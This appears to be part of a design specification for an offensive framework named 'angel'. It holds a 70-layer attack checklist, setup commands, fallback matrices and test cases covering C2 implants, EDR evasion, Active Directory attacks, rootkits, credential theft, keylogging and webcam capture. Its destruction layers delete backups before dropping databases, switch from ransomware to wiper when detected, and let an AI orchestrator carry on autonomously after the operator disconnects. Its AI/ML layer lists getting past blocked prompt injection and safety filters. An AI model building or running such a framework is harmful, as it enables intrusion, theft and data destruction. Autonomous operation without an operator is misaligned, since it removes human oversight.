| 17 | OSINT (DNS/Port/Web/Person/Company/Cloud) | [ ] |
| 18 | Exploitation (XSS/SSRF/RCE/LFI/GraphQL/API/CVE) | [ ] |
| 19 | Forensic Evidence | [ ] |
| 20 | Reporting | [ ] |
| 21 | Cleanup | [ ] |
| 22 | Auth Bypass Engine | [ ] |
| 23 | Network Evasion | [ ] |
| 24 | Full Scope Destruction | [ ] |
| 25 | Implant Generator | [ ] |
| 26 | Container/K8s Security (8 Docker + 12 K8s + 6 Privesc) | [ ] |
| 27 | Cloud Deep (20 AWS + 18 Azure + 16 GCP) | [ ] |
| 28 | Social Engineering (8 phishing + 5 pretexting + 6 OSINT + 4 campaign) | [ ] |
| 29 | Wireless (8 WiFi + 5 BT + 4 RFID/NFC + 5 tools) | [ ] |
| 30 | Supply Chain (6 dependency + 6 CI/CD + 4 package + 6 build) | [ ] |
| 31 | API Security Deep (8 auth + 6 business + 5 injection) | [ ] |
| 32 | Mobile Deep (10 iOS + 10 Android + 6 universal) | [ ] |
| 33 | Physical Security (5 USB + 4 lock + 3 badge + 4 enum + 5 tools) | [ ] |
| 34 | Purple Team (8 detection + 6 SOC + 5 MITRE + 4 report) | [ ] |
| 35 | Threat Intelligence (6 IOC + 4 MITRE + 5 feed + 4 report) | [ ] |
| 36 | Incident Response (6 sim + 6 counter + 5 playbook + 5 tools) | [ ] |
| 37 | Zero Trust Testing (6 identity + 6 network + 5 app + 4 data) | [ ] |
| 38 | Web3/DeFi (8 contract + 6 DeFi + 5 wallet + 3 NFT) | [ ] |
| 39 | Malware Analysis (6 static + 6 dynamic + 5 unpack + 5 evasion) | [ ] |
| 40 | AI/ML Attacks (6 model + 5 prompt + 5 infra + 5 safety) | [ ] |
| 41 | IPv6 Attacks (5 NDP + 4 DNSv6 + 4 transition) | [ ] |
| 42 | mDNS/LLMNR/NBT-NS Poisoning (4+4+4+3) | [ ] |
| 43 | SAML/OIDC Attacks (6 SAML + 5 OIDC + 4 OAuth) | [ ] |
| 44 | LDAP Injection (6 attack + 4 abuse) | [ ] |
| 45 | CSRF (6 attack + 4 exploit) | [ ] |
| 46 | Open Redirect (5 attack + 4 exploit) | [ ] |
| 47 | File Upload Bypass (8 bypass + 4 exploit) | [ ] |
| 48 | Subdomain Takeover (6 method + 8 target) | [ ] |
| 49 | Web Cache Poisoning (6 attack + 4 exploit) | [ ] |
| 50 | HTTP Request Smuggling (6 attack + 4 exploit) | [ ] |
| 51 | DNSSEC Bypass (5 attack + 3 abuse) | [ ] |
| 52 | Certificate Forgery (6 attack + 4 abuse) | [ ] |
| 53 | TLS 1.3 Attacks (5 attack + 4 abuse) | [ ] |
| 54 | SCADA/ICS (5 protocol + 5 exploit) | [ ] |
| 55 | IoT Attacks (8 attack + 5 exploit) | [ ] |
| 56 | Compliance Testing (8 PCI + 6 HIPAA + 6 GDPR + 5 ISO) | [ ] |
| 57 | Methodology Mapping (7 PTES + 10 OWASP + 6 NIST + 5 OSSTMM) | [ ] |
| 58 | OPSEC Procedures (6 comms + 6 data + 8 ops) | [ ] |
| 59 | Multi-Cloud (6 cross-cloud + 6 cloud-native) | [ ] |
| 60 | Web Misc (10 web attacks) | [ ] |
| 61 | Memory Corruption (8 buffer + 8 heap + 4 format + 6 ROP) | [ ] |
| 62 | Deserialization (6 Java + 5 Python + 5 PHP + 5 .NET + 3 Ruby) | [ ] |
| 63 | Race Conditions (5 TOCTOU + 6 concurrent + 5 state) | [ ] |
| 64 | GraphQL Deep (8 attack + 6 exploit + 4 infra) | [ ] |
| 65 | Cryptographic Attacks (4 padding + 5 hash + 7 crypto + 5 cert) | [ ] |
| 66 | Password Reset Vulns (7 bypass + 4 enum + 5 abuse) | [ ] |
| 67 | Business Logic Deep (7 logic + 6 payment + 6 flow) | [ ] |
| 68 | gRPC/Protobuf (6 attack + 5 exploit + 4 protobuf) | [ ] |
| 69 | VLAN Hopping (5 attack + 4 exploit + 4 defense bypass) | [ ] |
| 70 | ARP/DHCP Spoofing (5 ARP + 5 DHCP + 6 MITM) | [ ] |

---

## 35. TIMELINE PENGERJAAN

| Phase | Fokus | Target |
|-------|-------|--------|
| Phase 1 | Layer 1-5 (Core C2) | Minggu 1-2 |
| Phase 2 | Layer 6-10 (Evasion, AD, Lateral, Persist, Rootkit) | Minggu 3-4 |
| Phase 3 | Layer 11-15 (Credential, Collector, Destruct, Orchestrator, Brain) | Minggu 5-6 |
| Phase 4 | Layer 16-21 (Infra, OSINT, Exploit, Evidence, Report, Cleanup) | Minggu 7-8 |
| Phase 5 | Layer 22-25 (AuthBypass, Network Evasion, Destruction Chain, Implant) | Minggu 9-10 |
| Phase 6 | Layer 26-30 (Container, Cloud, SE, Wireless, Supply Chain) | Minggu 11-12 |
| Phase 7 | Layer 31-35 (API, Mobile, Physical, Purple Team, Threat Intel) | Minggu 13-14 |
| Phase 8 | Layer 36-40 (IR, Zero Trust, Web3, Malware, AI/ML) | Minggu 15-16 |
| Phase 9 | Layer 41-50 (IPv6, LLMNR, SAML, LDAP, CSRF, Redirect, Upload, Takeover, Cache, Smuggling) | Minggu 17-18 |
| Phase 10 | Layer 51-60 (DNSSEC, Cert, TLS, SCADA, IoT, Compliance, Methodology, OPSEC, Multi-Cloud, Web) | Minggu 19-20 |
| Phase 11 | Layer 61-62 (Memory Corruption, Deserialization) | Minggu 21-22 |
| Phase 12 | Layer 63-64 (Race Conditions, GraphQL) | Minggu 23-24 |
| Phase 13 | Layer 65-67 (Crypto, Password Reset, Business Logic) | Minggu 25-26 |
| Phase 14 | Layer 68-70 (gRPC, VLAN, ARP/DHCP) | Minggu 27-28 |

---

## 36. DOKUMENTASI CARA PAKAI

### Setup
```bash
git clone https://github.com/angel-framework/angel.git
cd angel && make setup
cp .env.example .env && edit .env
```

### Deployment
```bash
make infra-deploy ENV=production
make c2-deploy
make orchestrator-deploy
```

### Operasional
```bash
make listeners-start
make implant-generate OS=windows TARGET=x64
make dashboard
make engage SCOPE=target.txt
```

### Post-Engagement
```bash
make cleanup
make report FORMAT=pdf
make verify-clean
```

---

## 37. EDGE CASE MATRIX — 70 LAYERS

### Layer 1-5: Core C2

```
LAYER 1 - C2 FRAMEWORK:
├── Agent registration fails       → Retry with backoff → Alternate listener → ALERT
├── Teamserver crash               → Auto-restart → Backup teamserver → ALERT
├── Listener port blocked          → Rotate port → Use domain fronting → ALERT
├── Implant detected               → Self-destruct → Re-deploy → ALERT
├── Channel blocked                → Rotate channel → Use fallback → ALERT
├── Encryption key mismatch        → Regenerate key → Re-establish → ALERT
└── Database corruption            → Restore from backup → Rebuild → ALERT

LAYER 2 - DECOY:
├── Scanner spoofs valid header    → Token validation → IP whitelist → 404
├── Agent token expired            → 401 → Log failure → Block IP
├── Operator IP changes            → Re-auth → Log change → Alert if >2/hour
└── Decoy gets real traffic        → Log visitors → Harvest creds → Alert

LAYER 3 - SQL INJECTION:
├── WAF blocks all payloads        → Rotate encoding → Use alternate DBMS → ALERT
├── Blind injection timeout        → Increase delay → Use error-based → ALERT
├── Database error handling        → Use boolean-based → Use time-based → ALERT
└── Union injection blocked        → Use stacked queries → Use OOB → ALERT

LAYER 4 - NOSQL INJECTION:
├── MongoDB SCRAM required         → Error-based → Time-based blind → ALERT
├── Redis AUTH required            → Key brute-force → INFO enumeration → ALERT
└── Cassandra SSL                  → SSL bypass → CQL injection → ALERT

LAYER 5 - DATABASE POST-EXPLOIT:
├── DBA privileges denied          → User-level exploit → Data exfil only → ALERT
├── UDF install blocked            → Alternate UDF location → File system → ALERT
└── xp_cmdshell disabled           → sp_configure → CLR assembly → OPENROWSET → ALERT
```

### Layer 6-10: Evasion, AD, Lateral, Persist, Rootkit

```
LAYER 6 - C2 EVASION:
├── Sleep masking detected         → Rotate sleep technique → Use alternate → ALERT
├── Syscall hooked                 → Use indirect syscall → Standard API → ALERT
├── AMSI bypass fails              → Use alternate bypass → Rebuild implant → ALERT
├── ETW tampering detected         → Use alternate method → Alert operator → ALERT
└── Anti-analysis triggered        → Switch environment → Rebuild → ALERT

LAYER 7 - AD ATTACK:
├── Kerberos pre-auth required     → Use AS-REP roast → Alternate method → ALERT
├── ADCS ESC misconfigured         → Try alternate ESC → Manual exploit → ALERT
├── DCSync denied                  → Use alternate credential → Alert operator → ALERT
├── DC offline                     → Use cached creds → Lateral movement → ALERT
└── Trust relationship broken      → Use alternate domain → Manual exploit → ALERT

LAYER 8 - LATERAL MOVEMENT:
├── SMB blocked                    → Use WMI → Use WinRM → Use PSRemoting → ALERT
├── Pass-the-hash fails            → Use pass-the-ticket → Use golden ticket → ALERT
├── Pivot detection                → Rotate IP → Use tunnel → Alert operator → ALERT
└── Network segmentation           → Use jump host → Use VPN → ALERT

LAYER 9 - PERSISTENCE:
├── Persistence detected           → Re-persist via backup → Rotate mechanism → ALERT
├── Service creation blocked       → Use alternate method → Registry → Task → ALERT
├── Scheduled task blocked         → Use WMI event → Use startup folder → ALERT
└── Registry write blocked         → Use alternate location → Use service → ALERT

LAYER 10 - HARDWARE ROOTKIT:
├── Secure Boot enabled            → MOK enrollment → Shim exploit → SMM → ALERT
├── UEFI write-protected           → SPI flash protect → Hardware flash → Software → ALERT
├── SMM access denied              → SMRAM exploit → UFI → Software persistence → ALERT
└── JTAG disabled                  → UART console → Firmware emulation → Software → ALERT
```

### Layer 11-15: Credential, Collector, Destruction, Orchestrator, Brain

```
LAYER 11 - CREDENTIAL THEFT:
├── LSASS protected (PPL)          → PPL bypass → SSP injection → Hooking → ALERT
├── Browser encrypted              → Use master key → Decrypt offline → ALERT
├── Wallet encrypted              → Extract key → Use alternate method → ALERT
├── MFA token expired              → Re-harvest → Use backup method → ALERT
└── Biometric locked              → Bypass detection → Use alternate method → ALERT

LAYER 12 - COLLECTOR:
├── Screen capture blocked         → Use alternate API → Use browser-based → ALERT
├── Keylog detected                → Use alternate method → Use hook-based → ALERT
├── Webcam access denied           → Use alternate device → Use browser-based → ALERT
└── File grabber blocked           → Use alternate path → Use archive → ALERT

LAYER 13 - DESTRUCTION:
├── Database backup detected       → Delete backup first → Then DROP → ALERT
├── Ransomware detected early      → Switch to wiper → Increase speed → ALERT
├── Wiper fails on some volumes    → Skip failed → Continue remaining → ALERT
└── Operator disconnects           → Continue autonomous → Log progress → ALERT

LAYER 14 - ORCHESTRATOR:
├── LangGraph state corrupted      → Restore from backup → Rebuild state → ALERT
├── MCP server unreachable         → Use fallback server → Alert operator → ALERT
├── Fireteam agent failed          → Reassign tasks → Use remaining agents → ALERT
└── Task queue overflow            → Prioritize high-value → Queue low-value → ALERT

LAYER 15 - BRAIN:
├── Decision confidence low        → Request operator input → Use default → ALERT
├── Risk assessment high           → Pause execution → Request approval → ALERT
├── Behavior learning corrupted    → Reset learning → Use baseline → ALERT
└── Timing control failed          → Use default timing → Alert operator → ALERT
```

### Layer 16-21: Infra, OSINT, Exploit, Evidence, Report, Cleanup

```
LAYER 16 - INFRASTRUCTURE:
├── VPS provider blocks account    → Rotate to backup provider → Different region → ALERT
├── Terraform apply fails          → Check quota → Alternate region → Manual deploy → ALERT
├── WireGuard handshake fails      → Check firewall → OpenVPN fallback → IPsec → ALERT
└── Nginx SSL cert expires         → Auto-renew → Backup redirector → Alert operator → ALERT

LAYER 17 - OSINT:
├── DNS zone transfer blocked      → Subdomain brute-force → Cert transparency → Shodan
├── WAF blocks port scan           → Slow scan → Alternate ports → Passive recon
└── Shodan API rate limited        → Wait/retry → Alternate API → Censys

LAYER 18 - EXPLOITATION:
├── CSP blocks XSS                 → DOM-based XSS → Polyglot payload → SSRF
├── SSRF filter blocks internal    → Cloud metadata → Alternate protocols → Port scan
└── SSTI template filter           → Alternate engines → Polyglot payload → RCE

LAYER 19 - FORENSIC EVIDENCE:
├── Hash chain broken              → Detect break point → Rebuild → Alert operator
├── Screenshot fails               → Alternate capture → Text-based evidence → Log failure
└── S3 upload denied               → Local encrypted storage → Alternate S3 bucket → Alert

LAYER 20 - REPORTING:
├── PDF generation fails           → Markdown export → JSON export → Alert operator
├── Evidence missing               → Use available → Mark incomplete → Note in report
└── Encryption key lost            → Use backup key → Generate new key → Alert operator

LAYER 21 - CLEANUP:
├── Credential revocation fails    → Force rotate → Manual deletion → Alert operator
├── DB cleanup partial failure     → Log failed items → Retry with backoff → Manual cleanup
└── Cache scan finds artifacts     → Delete found → Re-scan to verify → Log completion
```

### Layer 22-25: Auth Bypass, Network Evasion, Destruction Chain, Implant

```
LAYER 22 - AUTH BYPASS:
├── Hashcat fails (GPU limit)      → Try John → Cloud GPU → Online crack → ALERT
├── JWT alg:none blocked           → Weak secret → kid injection → Session hijack → ALERT
└── Rate limit triggered           → Rotate IP → Slow down → Password spray → ALERT

LAYER 23 - NETWORK EVASION:
├── IP rotation blocked            → Proxy chain → VPN → Domain fronting → ALERT
├── DNS tunnel detected            → HTTP tunnel → ICMP tunnel → WebSocket → ALERT
└── Domain fronting blocked        → Alternate CDN → Direct connection → Alert operator → ALERT

LAYER 24 - DESTRUCTION CHAIN:
├── Destruction detected early     → Speed up → Switch faster method → Log partial → ALERT
├── Operator disconnects           → Continue autonomous → Queue tasks → Resume → ALERT
└── Partial destruction success    → Log succeeded → Retry failed → Complete remaining → ALERT

LAYER 25 - IMPLANT GENERATOR:
├── Binary detected by AV          → Re-encrypt new key → Alternate encryption → Alert operator
├── Beacon fails to register       → Check network → Alternate server → Fallback channel → ALERT
└── Encryption key expired         → Generate new key → Re-encrypt → Re-deploy → ALERT
```

### Layer 26-30: Container, Cloud, SE, Wireless, Supply Chain

```
LAYER 26 - CONTAINER/K8S:
├── Docker socket blocked          → Container escape → K8s API → Etcd dump → ALERT
├── K8s API restricted             → Service account → Pod injection → Node shell → ALERT
├── RBAC restricted                → Cluster role binding → Privileged pod → Node shell → ALERT
└── Admission controller active    → Bypass webhook → Use alternate namespace → ALERT

LAYER 27 - CLOUD DEEP:
├── IAM permission boundary        → Use alternate identity → SCP restriction → ALERT
├── AWS SCP restriction            → Use alternate account → Cross-account → ALERT
├── Azure AD blocked               → Use alternate identity → Hybrid attack → ALERT
└── GCP organization policy        → Use alternate project → Service account → ALERT

LAYER 28 - SOCIAL ENGINEERING:
├── Phishing email blocked         → Use alternate channel → Vishing → Physical access → ALERT
├── Pretexting detected            → Change pretext → Use alternate method → ALERT
└── Target suspicious              → Build trust → Use alternate approach → ALERT

LAYER 29 - WIRELESS:
├── WPA3 detected                  → Use KRACK → Use Dragonblood → Use alternate → ALERT
├── BLE pairing failed             → Use alternate method → Use sniffing → ALERT
└── RFID blocked                   → Use alternate frequency → Use relay → ALERT

LAYER 30 - SUPPLY CHAIN:
├── Dependency blocked             → Use alternate package → Use fork → ALERT
├── CI/CD pipeline locked          → Use alternate pipeline → Manual deploy → ALERT
└── Package registry blocked       → Use alternate registry → Self-host → ALERT
```

### Layer 31-35: API, Mobile, Physical, Purple Team, Threat Intel

```
LAYER 31 - API SECURITY:
├── OAuth redirect blocked         → Use alternate redirect → Direct exploit → ALERT
├── JWT validation failed          → Use alternate attack → Session hijack → ALERT
└── Rate limit triggered           → Rotate IP → Use alternate endpoint → ALERT

LAYER 32 - MOBILE:
├── Jailbreak detection active     → Use bypass → Use alternate method → ALERT
├── SSL pinning with cert transparency → Use bypass → Use alternate method → ALERT
└── Root detection active          → Use Magisk hide → Use alternate method → ALERT

LAYER 33 - PHYSICAL SECURITY:
├── USB drop detected              → Use alternate method → Use social engineering → ALERT
├── Lock picking fails             → Use bump key → Use bypass tool → ALERT
└── Badge clone fails              → Use emulation → Use tailgating → ALERT

LAYER 34 - PURPLE TEAM:
├── Detection rules updated        → Use alternate technique → Test detection → ALERT
├── SOC alert triggered            → Analyze response → Improve detection → ALERT
└── False positive generated       → Tune rules → Reduce noise → ALERT

LAYER 35 - THREAT INTEL:
├── IOC detected                   → Change IOC → Use alternate method → ALERT
├── Feed corrupted                 → Use alternate feed → Manual analysis → ALERT
└── MITRE mapping incomplete       → Add missing techniques → Complete mapping → ALERT
```

### Layer 36-40: IR, Zero Trust, Web3, Malware, AI/ML

```
LAYER 36 - INCIDENT RESPONSE:
├── Simulation detected            → Use alternate method → Use stealth → ALERT
├── Counter-IR detected            → Use alternate approach → Alert operator → ALERT
└── Playbook outdated              → Use alternate playbook → Manual response → ALERT

LAYER 37 - ZERO TRUST:
├── MFA bypass failed              → Use alternate method → Use session hijack → ALERT
├── ZTNA bypass failed             → Use alternate method → Use tunnel → ALERT
└── DLP bypass failed              → Use alternate method → Use encryption → ALERT

LAYER 38 - WEB3/DEFI:
├── Smart contract audit detected  → Use alternate contract → Manual exploit → ALERT
├── Flash loan failed              → Use alternate method → Use oracle manipulation → ALERT
└── Wallet locked                  → Use alternate method → Use seed phrase → ALERT

LAYER 39 - MALWARE ANALYSIS:
├── Static analysis detected       → Use obfuscation → Use packing → ALERT
├── Dynamic analysis detected      → Use sandbox evasion → Use alternate method → ALERT
└── Unpacking failed               → Use alternate unpacker → Manual analysis → ALERT

LAYER 40 - AI/ML ATTACKS:
├── Model access denied            → Use alternate method → Use API exploit → ALERT
├── Prompt injection blocked       → Use alternate method → Use encoding → ALERT
└── Safety filter active           → Use bypass → Use alternate method → ALERT
```

### Layer 41-50: IPv6, LLMNR, SAML, LDAP, CSRF, Redirect, Upload, Takeover, Cache, Smuggling

```
LAYER 41 - IPV6:
├── RA spoof blocked               → Use NS flood → Use DNSv6 spoof → ALERT
├── DNSv6 spoof failed             → Use tunnel abuse → Use dual stack → ALERT
└── Transition tunnel blocked      → Use alternate tunnel → Use direct → ALERT

LAYER 42 - MDNS/LLMNR/NBT-NS:
├── mDNS poison failed             → Use LLMNR → Use NBT-NS → Use WPAD → ALERT
├── LLMNR poison detected          → Use NBT-NS → Use WPAD → ALERT
└── NBT-NS poison blocked          → Use WPAD → Use NTLM relay → ALERT

LAYER 43 - SAML/OIDC:
├── SAML XXE blocked               → Use assertion replay → Use signature bypass → ALERT
├── OIDC redirect failed           → Use token theft → Use state bypass → ALERT
└── OAuth code steal failed        → Use token forge → Use scope escalation → ALERT

LAYER 44 - LDAP:
├── LDAP filter injection blocked  → Use null bind → Use wildcard → Use boolean → ALERT
├── LDAP null bind failed          → Use wildcard → Use time-based → ALERT
└── LDAP enum restricted           → Use alternate method → Use SPN enum → ALERT

LAYER 45 - CSRF:
├── CSRF token bypass failed       → Use referer bypass → Use SameSite bypass → ALERT
├── CSRF referer bypass failed     → Use SameSite bypass → Use JSON CSRF → ALERT
└── CSRF SameSite blocked          → Use flash CSRF → Use alternate method → ALERT

LAYER 46 - OPEN REDIRECT:
├── Redirect param blocked         → Use double encoding → Use protocol-relative → ALERT
├── Redirect encoding failed       → Use backslash → Use unicode → ALERT
└── Redirect blocked entirely      → Use direct phish → Use alternate method → ALERT

LAYER 47 - FILE UPLOAD:
├── Extension blacklist bypassed   → Use content-type → Use magic bytes → ALERT
├── Content-type bypass blocked    → Use magic bytes → Use double extension → ALERT
└── All bypasses failed            → Use polyglot → Use path traversal → ALERT

LAYER 48 - SUBDOMAIN TAKEOVER:
├── Dangling CNAME not found       → Use A record → Use NS record → ALERT
├── Cloud takeover failed          → Use alternate cloud → Use manual takeover → ALERT
└── Takeover detected              → Use stealth → Use alternate method → ALERT

LAYER 49 - WEB CACHE POISONING:
├── Unkeyed header blocked         → Use cookie poisoning → Use fat GET → ALERT
├── Cookie poisoning failed        → Use parameter cloaking → Use cache deception → ALERT
└── Cache poisoning detected       → Use key injection → Use alternate method → ALERT

LAYER 50 - HTTP REQUEST SMUGGLING:
├── CL.TE blocked                  → Use TE.CL → Use TE.TE → ALERT
├── TE.CL blocked                  → Use TE.TE → Use CL.CL → ALERT
└── H2C smuggling blocked          → Use HTTP/2 downgrade → Use alternate method → ALERT
```

### Layer 51-60: DNSSEC, Cert, TLS, SCADA, IoT, Compliance, Methodology, OPSEC, Multi-Cloud, Web

```
LAYER 51 - DNSSEC:
├── Zone walking blocked           → Use algo downgrade → Use key roll bypass → ALERT
├── Algorithm downgrade failed     → Use key roll bypass → Use CDS manipulation → ALERT
└── NSEC3 collision failed         → Use sig forge → Use replay attack → ALERT

LAYER 52 - CERTIFICATE FORGERY:
├── Rogue CA detected              → Use NTLM relay → Use shadow credentials → ALERT
├── NTLM relay blocked             → Use shadow credentials → Use weak key → ALERT
└── Shadow credentials failed      → Use weak key → Use self-signed → ALERT

LAYER 53 - TLS 1.3:
├── Middlebox compat blocked       → Use interception → Use handshake log → ALERT
├── Interception detected          → Use session abuse → Use key logging → ALERT
└── TLS downgrade blocked          → Use cipher downgrade → Use cert strip → ALERT

LAYER 54 - SCADA/ICS:
├── Modbus blocked                 → Use DNP3 → Use IEC 61850 → Use OPC UA → ALERT
├── DNP3 blocked                   → Use IEC 61850 → Use OPC UA → Use BACnet → ALERT
└── Air-gapped network             → Use USB drop → Use wireless → Use social engineering → ALERT

LAYER 55 - IOT:
├── Firmware extraction failed     → Use JTAG → Use UART → Use SPI → ALERT
├── Default cred blocked           → Use MQTT exploit → Use CoAP → ALERT
└── BLE exploit failed             → Use alternate method → Use Zigbee → ALERT

LAYER 56 - COMPLIANCE:
├── PCI-DSS scan failed           → Use alternate scan → Manual audit → ALERT
├── HIPAA PHI scan blocked        → Use alternate method → Manual review → ALERT
└── GDPR data mapping failed      → Use alternate method → Manual mapping → ALERT

LAYER 57 - METHODOLOGY:
├── PTES mapping incomplete        → Use OWASP → Use NIST → Use OSSTMM → ALERT
├── OWASP testing blocked         → Use PTES → Use NIST → Use OSSTMM → ALERT
└── NIST testing blocked          → Use PTES → Use OWASP → Use OSSTMM → ALERT

LAYER 58 - OPSEC:
├── Encrypted comms compromised    → Use dead drop → Use covert channel → ALERT
├── Dead drop discovered           → Use covert channel → Use code words → ALERT
└── Cover identity blown           → Use alternate identity → Extract → ALERT

LAYER 59 - MULTI-CLOUD:
├── AWS pivot blocked              → Use Azure pivot → Use GCP pivot → ALERT
├── Azure pivot blocked            → Use GCP pivot → Use hybrid attack → ALERT
└── Federation abuse blocked       → Use alternate method → Alert operator → ALERT

LAYER 60 - WEB MISC:
├── Host header injection blocked → Use SMS smuggling → Use email injection → ALERT
├── SMS smuggling blocked         → Use email injection → Use log injection → ALERT
└── All web attacks blocked        → Use alternate method → Alert operator → ALERT
```

### Layer 61-70: Memory Corruption, Deserialization, Race Conditions, GraphQL, Crypto, Password Reset, Business Logic, gRPC, VLAN, ARP/DHCP

```
LAYER 61 - MEMORY CORRUPTION:
├── Stack overflow blocked (ASLR)  → Use heap overflow → Use format string → ALERT
├── Heap overflow blocked (NX)     → Use UAF → Use double free → ALERT
├── Format string blocked          → Use ROP chain → Use shellcode → ALERT
├── ROP chain blocked (CFI)        → Use SROP → Use ret2dl_resolve → ALERT
└── Shellcode blocked              → Use ROP → Use format string → ALERT

LAYER 62 - DESERIALIZATION:
├── Java gadget blocked            → Use JNDI → Use LDAP → Use RMI → ALERT
├── Python pickle blocked          → Use YAML → Use marshal → ALERT
├── PHP unserialize blocked        → Use Phar → Use POP chain → ALERT
├── .NET BinaryFormatter blocked   → Use JavaScriptSerializer → Use Json.NET → ALERT
└── Ruby Marshal blocked           → Use YAML → Use Gem → ALERT

LAYER 63 - RACE CONDITIONS:
├── TOCTOU blocked                 → Use symlink race → Use temp file race → ALERT
├── Double spend detected          → Use double submit → Use concurrent request → ALERT
├── State race blocked             → Use queue jump → Use priority escalation → ALERT
└── All race conditions blocked    → Use alternate method → Alert operator → ALERT

LAYER 64 - GRAPHQL DEEP:
├── Batching attack blocked        → Use depth abuse → Use alias attack → ALERT
├── Introspection blocked          → Use field duplication → Use directive inject → ALERT
├── Depth abuse blocked            → Use alias attack → Use fragment spread → ALERT
└── All GraphQL attacks blocked    → Use alternate method → Alert operator → ALERT

LAYER 65 - CRYPTOGRAPHIC ATTACKS:
├── Padding oracle blocked         → Use length extension → Use collision → ALERT
├── Hash collision blocked         → Use preimage → Use rainbow table → ALERT
├── Timing attack blocked          → Use chosen plaintext → Use downgrade → ALERT
└── All crypto attacks blocked     → Use alternate method → Alert operator → ALERT

LAYER 66 - PASSWORD RESET:
├── Token prediction blocked       → Use token fixation → Use host header → ALERT
├── Token fixation blocked         → Use host header → Use email injection → ALERT
├── Host header blocked            → Use email injection → Use brute-force → ALERT
└── All reset attacks blocked      → Use alternate method → Alert operator → ALERT

LAYER 67 - BUSINESS LOGIC:
├── Price manipulation blocked     → Use quantity bypass → Use coupon abuse → ALERT
├── Quantity bypass blocked        → Use coupon abuse → Use referral abuse → ALERT
├── Payment bypass blocked         → Use IDOR → Use step skip → ALERT
└── All logic attacks blocked      → Use alternate method → Alert operator → ALERT

LAYER 68 - GRPC/PROTOBUF:
├── Reflection leak blocked        → Use bidi flood → Use unary flood → ALERT
├── Bidi flood blocked             → Use unary flood → Use metadata leak → ALERT
├── TLS bypass failed              → Use unknown field → Use oneof abuse → ALERT
└── All gRPC attacks blocked       → Use alternate method → Alert operator → ALERT

LAYER 69 - VLAN HOPPING:
├── Double tag blocked             → Use DTP spoof → Use native VLAN → ALERT
├── DTP spoof blocked              → Use native VLAN → Use trunk negotiate → ALERT
├── Native VLAN blocked            → Use trunk negotiate → Use VLAN shift → ALERT
└── All VLAN attacks blocked       → Use alternate method → Alert operator → ALERT

LAYER 70 - ARP/DHCP:
├── ARP spoof blocked              → Use DHCP starvation → Use rogue DHCP → ALERT
├── DHCP starvation blocked        → Use rogue DHCP → Use MITM ARP → ALERT
├── Rogue DHCP blocked             → Use MITM ARP → Use SSLStrip → ALERT
└── All ARP/DHCP attacks blocked   → Use alternate method → Alert operator → ALERT
```

---

## 38. TEST SCENARIOS — 70 LAYERS

### Layer 1-5: Core C2

```
LAYER 1 - C2 FRAMEWORK:
├── TC-001  Agent registration success          → Register → CheckIn → SendResult
├── TC-002  Agent registration failure          → Retry → Backoff → Alternate listener
├── TC-003  Teamserver crash recovery           → Auto-restart → Backup → Resume
├── TC-004  Listener port blocked               → Rotate port → Domain fronting → Resume
├── TC-005  Implant detection                   → Self-destruct → Re-deploy → Resume
├── TC-006  Channel blocked                     → Rotate channel → Fallback → Resume
├── TC-007  Encryption key mismatch             → Regenerate → Re-establish → Resume
├── TC-008  Database corruption                 → Restore backup → Rebuild → Resume
├── TC-009  Sleep masking success               → Sleep → Wake → Execute → Resume
├── TC-010  Syscall success                     → Execute → Return → Resume
├── TC-011  Channel rotation                    → HTTPS → DNS → WebSocket → Resume
├── TC-012  Domain fronting                     → Cloudflare → CloudFront → Resume
├── TC-013  SMB Beacon connection               → Connect → Execute → Resume
├── TC-014  Environment detection               → Detect VM → Detect EDR → Adapt
├── TC-015  Resilience test                     → Simulate failure → Recovery → Resume
├── TC-016  Dead man's switch                   → Timeout → Cleanup → Self-destruct
└── TC-017  Recovery state machine              → Normal → Detected → Recovery → Normal

LAYER 2 - DECOY:
├── TC-018  Request without header              → 404 decoy
├── TC-019  Request with valid beacon token     → /api/v1/*
├── TC-020  Request with valid operator key     → /admin/*
├── TC-021  Request with expired token          → 401
├── TC-022  Scanner spoofing agent header       → 404 decoy
├── TC-023  Nmap scan detected                  → Decoy site
├── TC-024  Browser request                     → Decoy site
└── TC-025  Multiple failed token attempts      → IP blocked

LAYER 3 - SQL INJECTION:
├── TC-026  MySQL boolean blind                 → Data extraction
├── TC-027  MySQL time-based                    → Data extraction
├── TC-028  MySQL error-based                   → Data extraction
├── TC-029  MySQL union-based                   → Data extraction
├── TC-030  PostgreSQL boolean blind            → Data extraction
├── TC-031  PostgreSQL time-based               → Data extraction
├── TC-032  PostgreSQL error-based              → Data extraction
├── TC-033  MSSQL xp_cmdshell                   → RCE
├── TC-034  MSSQL error-based                   → Data extraction
├── TC-035  Oracle boolean blind                → Data extraction
├── TC-036  Oracle time-based                   → Data extraction
├── TC-037  SQLite boolean blind                → Data extraction
├── TC-038  WAF bypass hex encoding             → Payload executed
├── TC-039  WAF bypass char function            → Payload executed
├── TC-040  WAF bypass case variation           → Payload executed
├── TC-041  WAF bypass comment insertion        → Payload executed
├── TC-042  WAF bypass whitespace               → Payload executed
├── TC-043  WAF bypass double URL encoding      → Payload executed
├── TC-044  WAF bypass unicode                  → Payload executed
├── TC-045  WAF bypass JSON body                → Payload executed
├── TC-046  WAF bypass GraphQL                  → Payload executed
├── TC-047  WAF bypass XML                      → Payload executed
├── TC-048  WAF bypass multipart                → Payload executed
└── TC-049  WAF bypass UA rotation              → Payload executed

LAYER 4 - NOSQL INJECTION:
├── TC-050  MongoDB $ne auth bypass             → Bypass success
├── TC-051  MongoDB boolean blind               → Data extraction
├── TC-052  MongoDB JS injection                → RCE
├── TC-053  Redis command injection             → Command execution
├── TC-054  Elasticsearch query injection       → Data exfil
├── TC-055  CouchDB auth bypass                 → Bypass success
└── TC-056  Cassandra CQL injection             → Data extraction

LAYER 5 - DATABASE POST-EXPLOIT:
├── TC-057  Oracle Java object injection        → RCE
├── TC-058  MySQL UDF install                   → sys_exec success
├── TC-059  PostgreSQL COPY TO PROGRAM          → OS command
├── TC-060  MSSQL xp_cmdshell                   → Command execution
├── TC-061  MSSQL CLR assembly                  → .NET execution
├── TC-062  DBA privilege denied                → User-level exploit
└── TC-063  Registry dump                       → Credential extraction
```

### Layer 6-10: Evasion, AD, Lateral, Persist, Rootkit

```
LAYER 6 - C2 EVASION:
├── TC-064  Hell's Gate syscall                 → Success
├── TC-065  Halo's Gate syscall                 → Success
├── TC-066  Tartarus Gate syscall               → Success
├── TC-067  FreshyCalls syscall                 → Success
├── TC-068  SysWhispers3 syscall                → Success
├── TC-069  Indirect syscall                    → Success
├── TC-070  Recycled Gate syscall               → Success
├── TC-071  Sleep masking VirtualProtect+RC4    → Sleep success
├── TC-072  Sleep masking Thread Stack Spoofing → Sleep success
